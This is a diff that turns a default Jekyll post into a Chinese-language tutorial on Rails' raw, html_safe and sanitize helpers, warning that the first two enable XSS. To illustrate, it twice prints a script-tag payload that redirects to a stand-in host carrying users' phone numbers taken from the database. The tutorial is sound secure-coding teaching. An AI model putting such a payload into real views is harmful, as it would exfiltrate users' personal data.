@@ -1,25 +1,59 @@
 ---
 layout: post
-title:  "Welcome to Jekyll!"
+title:  "rails中的 raw, html_safe, sanitize"
 date:   2018-09-04 18:10:22 +0800
-categories: jekyll update
+categories: blank update
 ---
-You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.
-
-To add new posts, simply add a file in the `_posts` directory that follows the convention `YYYY-MM-DD-name-of-post.ext` and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.
-
-Jekyll also offers powerful support for code snippets:
-
+避免使用`raw`和`html_safe`, 安全使用`sanitize`
+- ### raw
+例如：
 {% highlight ruby %}
-def print_hi(name)
-  puts "Hi, #{name}"
+<%= raw "<script type=\"text/javascript\">window.location.href='http://www.test.com?a=#{User.limit(10).map(&:phone).join(',')}';</script>" %>
+{% endhighlight %}
+结果：
+执行 `script`中的内容，并且查询`User`数据发送给`www.test.com`,如果`www.test.com`是自己的服务器，我们可以在服务器中截取`User`用户数据，比如`cookie`
+
+我们可以看raw的源代码，其实就是用`html_safe`实现的
+{% highlight ruby %}
+def raw(stringish)
+  stringish.to_s.html_safe
 end
-print_hi('Tom')
-#=> prints 'Hi, Tom' to STDOUT.
 {% endhighlight %}
 
-Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
+- ### html_safe
 
-[jekyll-docs]: https://jekyllrb.com/docs/home
-[jekyll-gh]:   https://github.com/jekyll/jekyll
-[jekyll-talk]: https://talk.jekyllrb.com/
+html_safe是完全把你的html内容原本原样的输出，这种事非常不安全的，把`script`标签的内容输出并执行结果，比如会造成XSS攻击
+和`raw`一样，同上
+
+- ### sanitize
+
+`sanitize`的源代码中：
+{% highlight ruby %}
+self.allowed_tags = Set.new(%w(strong em b i p code pre tt samp kbd var sub
+  sup dfn cite big small address hr br div span h1 h2 h3 h4 h5 h6 ul ol li dl dt dd abbr
+  acronym a img blockquote del ins))
+self.allowed_attributes = Set.new(%w(href src width height alt cite datetime title class name xml:lang abbr))
+{% endhighlight %}
+
+我们可以看到，`sanitize`是有默认的白名单，把一些危险的标签给去除掉，相对`html_safe`安全很多
+也可以自己设置白名单
+在`config/appliction.rb`中设置：
+{% highlight ruby %}
+class Application < Rails::Application
+ config.action_view.sanitized_allowed_tags = ['table', 'tr', 'td'] #安全的标签
+ config.action_view.sanitized_allowed_attributes = ['id', 'class', 'style'] #安全的属性
+end
+{% endhighlight %}
+
+例如：
+{% highlight ruby %}
+<%= sanitize "<script type=\"text/javascript\">window.location.href='http://www.test.com?a=#{User.limit(10).map(&:phone).join(',')}';</script>" %>
+{% endhighlight %}
+结果：
+{% highlight ruby %}
+window.location.href='http://www.test.com?a=***';
+{% endhighlight %}
+
+并不会执行`script`,而是把不是白名单的标签内容输出
+
+不管怎么样，使用`sanitize`就好了，如果有需求也可以自行配置`sanitize`的白名单，比较安全可靠
